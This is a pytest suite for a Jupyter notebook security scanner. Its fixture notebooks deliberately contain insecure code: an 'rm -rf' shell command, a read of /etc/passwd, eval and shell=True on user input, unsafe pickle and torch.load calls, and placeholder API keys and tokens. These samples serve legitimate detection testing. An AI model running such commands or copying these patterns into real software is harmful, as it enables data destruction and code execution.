"""Tests for Jupyter notebook security analysis."""

import json
from pathlib import Path
import tempfile

import pytest

from pyguard.lib.notebook_security import (
    NotebookCell,
    NotebookFixer,
    NotebookIssue,
    NotebookSecurityAnalyzer,
    scan_notebook,
)


@pytest.fixture
def temp_notebook():
    """Create a temporary notebook file for testing."""
    temp_file = tempfile.NamedTemporaryFile(
        mode="w", suffix=".ipynb", delete=False, encoding="utf-8"
    )
    return Path(temp_file.name)


@pytest.fixture
def sample_notebook():
    """Create a sample notebook with various security issues."""
    return {
        "cells": [
            {
                "cell_type": "code",
                "execution_count": 1,
                "source": ["import os\n", "import pandas as pd"],
                "outputs": [],
                "metadata": {},
            },
            {
                "cell_type": "code",
                "execution_count": 2,
                "source": [
                    "password = 'SuperSecret123'  # SECURITY: Use environment variables or config files\n",
                    "api_key = 'sk-1234567890abcdef1234567890abcdef'",
                ],
                "outputs": [],
                "metadata": {},
            },
            {
                "cell_type": "code",
                "execution_count": 3,
                "source": ["!rm -rf /tmp/test\n", "%%bash\n", "echo 'Hello'"],
                "outputs": [],
                "metadata": {},
            },
        ],
        "metadata": {},
        "nbformat": 4,
        "nbformat_minor": 5,
    }


class TestNotebookSecurityAnalyzer:
    """Tests for NotebookSecurityAnalyzer class."""

    def test_initialization(self):
        """Test analyzer initialization."""
        analyzer = NotebookSecurityAnalyzer()
        assert analyzer is not None
        assert hasattr(analyzer, "logger")

    def test_analyze_nonexistent_file(self):
        """Test analyzing a nonexistent file raises error."""
        analyzer = NotebookSecurityAnalyzer()
        with pytest.raises(FileNotFoundError):
            analyzer.analyze_notebook(Path("/nonexistent/notebook.ipynb"))

    def test_analyze_non_notebook_file(self, temp_notebook):
        """Test analyzing non-.ipynb file raises error."""
        # Create a .py file instead
        py_file = Path(str(temp_notebook).replace(".ipynb", ".py"))
        py_file.write_text("print('hello')")

        analyzer = NotebookSecurityAnalyzer()
        with pytest.raises(ValueError, match="Not a notebook file"):
            analyzer.analyze_notebook(py_file)

        py_file.unlink()

    def test_analyze_invalid_json(self, temp_notebook):
        """Test analyzing invalid JSON raises error."""
        temp_notebook.write_text("not valid json")

        analyzer = NotebookSecurityAnalyzer()
        with pytest.raises(ValueError, match="Invalid notebook JSON"):
            analyzer.analyze_notebook(temp_notebook)

        temp_notebook.unlink()

    def test_parse_cells(self, sample_notebook):
        """Test parsing notebook cells."""
        analyzer = NotebookSecurityAnalyzer()
        cells = analyzer._parse_cells(sample_notebook)

        assert len(cells) == 3
        assert all(isinstance(cell, NotebookCell) for cell in cells)
        assert cells[0].cell_type == "code"
        assert "import os" in cells[0].source

    def test_detect_magic_commands(self, temp_notebook, sample_notebook):
        """Test detection of dangerous magic commands."""
        temp_notebook.write_text(json.dumps(sample_notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        # Should detect !rm and %%bash
        magic_issues = [i for i in issues if i.category == "Unsafe Magic Command"]
        assert len(magic_issues) >= 2
        assert any("!" in i.code_snippet for i in magic_issues)
        assert any("%%bash" in i.code_snippet for i in magic_issues)

        temp_notebook.unlink()

    def test_detect_hardcoded_secrets(self, temp_notebook, sample_notebook):
        """Test detection of hardcoded secrets."""
        temp_notebook.write_text(json.dumps(sample_notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        # Should detect password and api_key
        secret_issues = [i for i in issues if i.category == "Hardcoded Secret"]
        assert len(secret_issues) >= 2
        assert any(i.severity == "HIGH" for i in secret_issues)
        assert any("password" in i.message.lower() for i in secret_issues)
        assert any("api" in i.message.lower() for i in secret_issues)

        temp_notebook.unlink()

    def test_detect_code_injection(self, temp_notebook):
        """Test detection of eval/exec usage."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": ["user_input = input()\n", "eval(user_input)"],  # DANGEROUS: Avoid eval with untrusted input
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        code_injection_issues = [i for i in issues if i.category == "Code Injection"]
        assert len(code_injection_issues) >= 1
        assert code_injection_issues[0].severity == "CRITICAL"
        assert "CWE-95" in code_injection_issues[0].cwe_id

        temp_notebook.unlink()

    def test_detect_unsafe_deserialization(self, temp_notebook):
        """Test detection of pickle usage."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "import pickle\n",
                        "with open('data.pkl', 'rb') as f:\n",
                        "    data = pickle.load(f)",  # SECURITY: Don't use pickle with untrusted data
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        pickle_issues = [i for i in issues if i.category == "Unsafe Deserialization"]
        assert len(pickle_issues) >= 1
        assert pickle_issues[0].severity == "CRITICAL"  # pickle.load is CRITICAL severity  # SECURITY: Don't use pickle with untrusted data
        assert "pickle" in pickle_issues[0].message.lower()

        temp_notebook.unlink()

    def test_detect_command_injection(self, temp_notebook):
        """Test detection of subprocess with shell=True."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "import subprocess\n",
                        "cmd = input('Enter command: ')\n",
                        "subprocess.run(cmd, shell=True)",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        cmd_injection_issues = [i for i in issues if i.category == "Command Injection"]
        assert len(cmd_injection_issues) >= 1
        assert cmd_injection_issues[0].severity == "CRITICAL"
        assert "shell=True" in cmd_injection_issues[0].message

        temp_notebook.unlink()

    def test_detect_path_disclosure(self, temp_notebook):
        """Test detection of path disclosure in outputs."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": ["raise Exception('test')"],
                    "outputs": [
                        {
                            "output_type": "error",
                            "traceback": [
                                "Traceback (most recent call last):",
                                '  File "/home/user/secret/project/script.py", line 1, in <module>',
                                "    raise Exception('test')",
                            ],
                        }
                    ],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        disclosure_issues = [i for i in issues if i.category == "Information Disclosure"]
        assert len(disclosure_issues) >= 1
        assert disclosure_issues[0].severity == "MEDIUM"
        assert "path" in disclosure_issues[0].message.lower()

        temp_notebook.unlink()

    def test_detect_execution_order_issues(self, temp_notebook):
        """Test detection of variable use before definition."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": ["print(result)"],  # Used before defined
                    "outputs": [],
                    "metadata": {},
                },
                {
                    "cell_type": "code",
                    "execution_count": 2,
                    "source": ["result = 42"],  # Defined after use
                    "outputs": [],
                    "metadata": {},
                },
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        order_issues = [i for i in issues if i.category == "Execution Order Issue"]
        assert len(order_issues) >= 1
        assert "result" in order_issues[0].message
        assert "before definition" in order_issues[0].message

        temp_notebook.unlink()

    def test_skip_markdown_cells(self, temp_notebook):
        """Test that markdown cells are skipped."""
        notebook = {
            "cells": [
                {
                    "cell_type": "markdown",
                    "source": ["# This is markdown\n", "password = 'fake'"],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        # Should not detect secrets in markdown cells
        assert len(issues) == 0

        temp_notebook.unlink()

    def test_handle_syntax_errors_gracefully(self, temp_notebook):
        """Test that syntax errors in cells don't crash the analyzer."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": ["def incomplete_function("],  # Syntax error
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        # Should not raise exception
        issues = analyzer.analyze_notebook(temp_notebook)
        assert isinstance(issues, list)

        temp_notebook.unlink()


class TestNotebookFixer:
    """Tests for NotebookFixer class."""

    def test_initialization(self):
        """Test fixer initialization."""
        fixer = NotebookFixer()
        assert fixer is not None

    def test_fix_hardcoded_secret(self, temp_notebook):
        """Test fixing hardcoded secrets."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": "password = 'SuperSecret123'",
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        issue = NotebookIssue(
            severity="HIGH",
            category="Hardcoded Secret",
            message="Password detected",
            cell_index=0,
            line_number=1,
            code_snippet="password = 'SuperSecret123'",
            fix_suggestion="Use environment variables",
            auto_fixable=True,
        )

        fixer = NotebookFixer()
        success, fixes = fixer.fix_notebook(temp_notebook, [issue])

        assert success
        assert len(fixes) > 0
        # First fix is backup creation, second is the actual fix
        assert "backup" in fixes[0].lower() or "Commented out" in fixes[0]

        # Verify the fix was applied
        with open(temp_notebook) as f:
            fixed_notebook = json.load(f)

        assert "SECURITY" in fixed_notebook["cells"][0]["source"]

        temp_notebook.unlink()

    def test_no_fixes_needed(self, temp_notebook):
        """Test when no fixes are needed."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": "import pandas as pd",
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        fixer = NotebookFixer()
        success, fixes = fixer.fix_notebook(temp_notebook, [])

        assert success  # Operation succeeded (idempotent - no fixes needed)
        assert len(fixes) == 0  # No fixes were applied

        temp_notebook.unlink()


class TestConvenienceFunctions:
    """Tests for convenience functions."""

    def test_scan_notebook_function(self, temp_notebook):
        """Test scan_notebook convenience function."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": "password = 'test123456789'",
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        issues = scan_notebook(str(temp_notebook))

        assert isinstance(issues, list)
        assert len(issues) > 0
        assert all(isinstance(i, NotebookIssue) for i in issues)

        temp_notebook.unlink()


class TestEdgeCases:
    """Test edge cases and error conditions."""

    def test_empty_notebook(self, temp_notebook):
        """Test analyzing empty notebook."""
        notebook = {"cells": [], "metadata": {}, "nbformat": 4, "nbformat_minor": 5}
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        assert isinstance(issues, list)
        assert len(issues) == 0

        temp_notebook.unlink()

    def test_notebook_with_empty_cells(self, temp_notebook):
        """Test notebook with empty code cells."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": None,
                    "source": "",
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        assert isinstance(issues, list)
        assert len(issues) == 0

        temp_notebook.unlink()

    def test_aws_credential_detection(self, temp_notebook):
        """Test detection of AWS credentials."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "aws_access_key_id = 'AKIAIOSFODNN7EXAMPLE'\n",
                        "aws_secret_access_key = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        aws_issues = [i for i in issues if "AWS" in i.message or "aws" in i.message.lower()]
        assert len(aws_issues) >= 1

        temp_notebook.unlink()

    def test_system_magic_command(self, temp_notebook):
        """Test detection of %system magic command."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": "%system ls -la /etc/passwd",
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        system_issues = [i for i in issues if "%system" in i.code_snippet]
        assert len(system_issues) >= 1
        assert system_issues[0].severity == "HIGH"

        temp_notebook.unlink()

    def test_load_ext_magic_command(self, temp_notebook):
        """Test detection of %load_ext magic command."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": "%load_ext untrusted_extension",
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        loadext_issues = [i for i in issues if "%load_ext" in i.code_snippet]
        assert len(loadext_issues) >= 1

        temp_notebook.unlink()

    def test_pii_detection_email(self, temp_notebook):
        """Test detection of email addresses (PII)."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": "user_email = 'john.doe@company.com'",
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        pii_issues = [i for i in issues if i.category == "PII Exposure"]
        assert len(pii_issues) >= 1
        assert "Email" in pii_issues[0].message

        temp_notebook.unlink()

    def test_pii_detection_ssn(self, temp_notebook):
        """Test detection of Social Security Numbers."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": "ssn = '987-65-4321'  # Real SSN - DO NOT COMMIT",
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        pii_issues = [i for i in issues if i.category == "PII Exposure"]
        assert len(pii_issues) >= 1
        assert "Social Security Number" in pii_issues[0].message

        temp_notebook.unlink()

    def test_pii_false_positive_filtering(self, temp_notebook):
        """Test that common test/example values don't trigger PII detection."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "test_email = 'test@example.com'\n",
                        "test_ip = '127.0.0.1'\n",
                        "example_ssn = '123-45-6789'",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        # Should not detect PII for test/example values
        pii_issues = [i for i in issues if i.category == "PII Exposure"]
        assert len(pii_issues) == 0

        temp_notebook.unlink()

    def test_ml_security_pickle_load(self, temp_notebook):
        """Test detection of unsafe pickle loading in ML code."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "import torch\n",
                        "model = torch.load('untrusted_model.pth')",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        ml_issues = [i for i in issues if i.category == "ML Pipeline Security"]
        assert len(ml_issues) >= 1
        assert "PyTorch" in ml_issues[0].message or "torch" in ml_issues[0].message

        temp_notebook.unlink()

    def test_ml_security_data_validation(self, temp_notebook):
        """Test detection of missing data validation in ML pipelines."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "import pandas as pd\n",
                        "df = pd.read_csv('untrusted_data.csv')",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        validation_issues = [i for i in issues if i.category == "Data Validation"]
        assert len(validation_issues) >= 1
        assert "data poisoning" in validation_issues[0].message.lower()

        temp_notebook.unlink()

    def test_xss_vulnerability_detection(self, temp_notebook):
        """Test detection of XSS vulnerabilities in HTML display."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "from IPython.display import HTML\n",
                        "user_input = input('Enter HTML: ')\n",
                        "display(HTML(user_input))",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        xss_issues = [i for i in issues if i.category == "XSS Vulnerability"]
        assert len(xss_issues) >= 1
        assert xss_issues[0].severity == "HIGH"

        temp_notebook.unlink()

    def test_pii_in_output_detection(self, temp_notebook):
        """Test detection of PII exposed in cell outputs."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": "print('Email: alice@secretcorp.com')",
                    "outputs": [
                        {
                            "output_type": "stream",
                            "name": "stdout",
                            "text": ["Email: alice@secretcorp.com\n"],
                        }
                    ],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        output_pii_issues = [i for i in issues if i.category == "PII in Output"]
        assert len(output_pii_issues) >= 1
        assert "Email" in output_pii_issues[0].message

        temp_notebook.unlink()

    def test_metadata_untrusted_notebook(self, temp_notebook):
        """Test detection of explicitly untrusted notebooks."""
        notebook = {
            "cells": [],
            "metadata": {"trusted": False},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        untrusted_issues = [i for i in issues if i.category == "Untrusted Notebook"]
        assert len(untrusted_issues) == 1
        assert untrusted_issues[0].severity == "MEDIUM"

        temp_notebook.unlink()

    def test_metadata_nonstandard_kernel(self, temp_notebook):
        """Test detection of non-standard kernels."""
        notebook = {
            "cells": [],
            "metadata": {
                "kernelspec": {
                    "name": "custom_kernel",
                    "display_name": "Custom Kernel",
                }
            },
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        kernel_issues = [i for i in issues if i.category == "Non-Standard Kernel"]
        assert len(kernel_issues) == 1
        assert "custom_kernel" in kernel_issues[0].code_snippet

        temp_notebook.unlink()

    def test_auto_fix_pii_in_output(self, temp_notebook):
        """Test auto-fixing PII in outputs by clearing them."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": "print('test')",
                    "outputs": [
                        {
                            "output_type": "stream",
                            "name": "stdout",
                            "text": ["Email: test@realcompany.com\n"],
                        }
                    ],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        issue = NotebookIssue(
            severity="HIGH",
            category="PII in Output",
            message="Email in output",
            cell_index=0,
            line_number=0,
            code_snippet="test@realcompany.com",
            fix_suggestion="Clear outputs",
            auto_fixable=True,
        )

        fixer = NotebookFixer()
        success, fixes = fixer.fix_notebook(temp_notebook, [issue])

        assert success
        assert any("Cleared outputs" in fix for fix in fixes)

        # Verify outputs were cleared
        with open(temp_notebook) as f:
            fixed_notebook = json.load(f)

        assert len(fixed_notebook["cells"][0]["outputs"]) == 0

        temp_notebook.unlink()

    def test_github_token_detection(self, temp_notebook):
        """Test detection of GitHub tokens."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": "github_token = 'ghp_1234567890abcdefghijklmnopqrstuvwxyz'",
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        github_issues = [
            i for i in issues if "GitHub" in i.message or "github" in i.message.lower()
        ]
        assert len(github_issues) >= 1

        temp_notebook.unlink()


class TestEnhancedFeatures:
    """Tests for enhanced notebook security features."""

    def test_entropy_based_secret_detection(self, temp_notebook):
        """Test high-entropy secret detection using Shannon entropy."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "# High-entropy base64-encoded secret\n",
                        "secret = 'aGlnaGVudHJvcHlzdHJpbmdmb3J0ZXN0aW5ncHVycG9zZXNvbmx5bm90cmVhbA=='\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        entropy_issues = [i for i in issues if "High-Entropy" in i.category]
        assert len(entropy_issues) >= 1
        assert any("entropy" in i.message.lower() for i in entropy_issues)

        temp_notebook.unlink()

    def test_torch_load_without_weights_only(self, temp_notebook):
        """Test detection of torch.load() without weights_only=True."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "import torch\n",
                        "model = torch.load('model.pth')\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        torch_issues = [i for i in issues if "torch.load" in i.message]
        assert len(torch_issues) >= 1
        assert any("weights_only" in i.message for i in torch_issues)
        assert any(i.severity == "CRITICAL" for i in torch_issues)
        assert any(i.auto_fixable for i in torch_issues)

        temp_notebook.unlink()

    def test_torch_load_with_weights_only_safe(self, temp_notebook):
        """Test that torch.load() with weights_only=True is not flagged."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "import torch\n",
                        "model = torch.load('model.pth', weights_only=True)\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        # Should not flag as unsafe since weights_only=True
        torch_issues = [
            i for i in issues if "torch.load" in i.message and "arbitrary code" in i.message.lower()
        ]
        assert len(torch_issues) == 0

        temp_notebook.unlink()

    def test_reproducibility_missing_torch_seed(self, temp_notebook):
        """Test detection of PyTorch usage without seed setting."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "import torch\n",
                        "import torch.nn as nn\n",
                        "model = nn.Linear(10, 1)\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        repro_issues = [i for i in issues if "Reproducibility" in i.category]
        assert len(repro_issues) >= 1
        assert any("PyTorch" in i.message or "torch" in i.message.lower() for i in repro_issues)
        assert any("seed" in i.message.lower() for i in repro_issues)
        assert any(i.auto_fixable for i in repro_issues)

        temp_notebook.unlink()

    def test_reproducibility_with_seed_no_issue(self, temp_notebook):
        """Test that PyTorch with seed set does not flag missing seed."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "import torch\n",
                        "torch.manual_seed(42)\n",
                        "import torch.nn as nn\n",
                        "model = nn.Linear(10, 1)\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        # Should not flag missing seed issue for PyTorch (seed is set)
        repro_issues = [
            i for i in issues if "Reproducibility" in i.category and "seed not set" in i.message
        ]
        assert len(repro_issues) == 0

        temp_notebook.unlink()

    def test_unpinned_pip_install_detection(self, temp_notebook):
        """Test detection of unpinned pip install commands."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "%pip install numpy pandas\n",
                        "!pip install torch\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        unpinned_issues = [i for i in issues if "Unpinned Dependency" in i.category]
        assert len(unpinned_issues) >= 2
        assert any("reproducibility" in i.message.lower() for i in unpinned_issues)

        temp_notebook.unlink()

    def test_multiple_ml_frameworks_seed_detection(self, temp_notebook):
        """Test detection of multiple ML frameworks without seeds."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "import torch\n",
                        "import numpy as np\n",
                        "import tensorflow as tf\n",
                        "import random\n",
                        "import secrets  # Use secrets for cryptographic randomness\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        repro_issues = [i for i in issues if "Reproducibility" in i.category]
        assert len(repro_issues) >= 3

        temp_notebook.unlink()

    def test_enhanced_secret_patterns(self, temp_notebook):
        """Test detection of various secret patterns."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": [
                        "# Various secret types (using test placeholders)\n",
                        "aws_key = 'AKIAIOSFODNN7EXAMPLE'\n",
                        "openai_key = 'sk-proj-testkeytestkeytestkeytestkeytestkey123456'\n",
                        "slack_token = 'xoxb-1234567890-1234567890-testtokentesttoken'\n",
                    ],
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        secret_issues = [
            i for i in issues if "Secret" in i.category or "secret" in i.message.lower()
        ]
        assert len(secret_issues) >= 2

        temp_notebook.unlink()

    def test_torch_load_auto_fix(self, temp_notebook):
        """Test auto-fix for torch.load() adds weights_only=True."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": "import torch\nmodel = torch.load('model.pth')",
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

        torch_issues = [i for i in issues if "torch.load" in i.message and i.auto_fixable]
        assert len(torch_issues) >= 1

        fixer = NotebookFixer()
        success, fixes = fixer.fix_notebook(temp_notebook, torch_issues)

        assert success
        assert len(fixes) > 0

        with open(temp_notebook) as f:
            fixed_notebook = json.load(f)

        fixed_source = fixed_notebook["cells"][0]["source"]
        if isinstance(fixed_source, list):
            fixed_source = "".join(fixed_source)

        assert "weights_only" in fixed_source or "SECURITY" in fixed_source

        temp_notebook.unlink()

    def test_reproducibility_seed_auto_fix(self, temp_notebook):
        """Test auto-fix for missing seeds adds seed setting."""
        notebook = {
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "source": "import torch\nimport torch.nn as nn",
                    "outputs": [],
                    "metadata": {},
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }
        temp_notebook.write_text(json.dumps(notebook))

        analyzer = NotebookSecurityAnalyzer()
        issues = analyzer.analyze_notebook(temp_notebook)

